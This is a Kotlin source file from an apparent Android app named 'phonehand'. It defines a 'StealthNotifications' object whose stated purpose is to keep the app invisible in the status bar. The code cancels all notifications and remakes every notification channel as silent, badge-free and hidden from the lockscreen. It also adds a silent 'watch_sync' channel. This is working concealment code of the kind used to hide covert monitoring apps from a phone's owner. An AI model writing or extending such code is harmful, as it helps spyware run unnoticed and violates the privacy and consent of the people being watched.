package com.phonehand.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.util.Log

/** Keep the app invisible in the status bar — no notification permission prompts or icons. */
object StealthNotifications {
    private const val TAG = "StealthNotif"
    private const val SILENT_CHANNEL = "watch_sync_silent"

    fun suppressAll(context: Context) {
        val app = context.applicationContext
        val nm = app.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return
        runCatching {
            nm.cancelAll()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                for (ch in nm.notificationChannels) {
                    val silent = NotificationChannel(
                        ch.id,
                        ch.name?.toString() ?: " ",
                        NotificationManager.IMPORTANCE_NONE,
                    ).apply {
                        setShowBadge(false)
                        enableLights(false)
                        enableVibration(false)
                        setSound(null, null)
                        lockscreenVisibility = Notification.VISIBILITY_SECRET
                    }
                    nm.createNotificationChannel(silent)
                }
                nm.createNotificationChannel(
                    NotificationChannel(SILENT_CHANNEL, " ", NotificationManager.IMPORTANCE_NONE).apply {
                        setShowBadge(false)
                        enableLights(false)
                        enableVibration(false)
                    },
                )
            }
            Log.d(TAG, "notifications suppressed")
        }.onFailure {
            Log.w(TAG, it.message ?: "suppress")
        }
    }
}
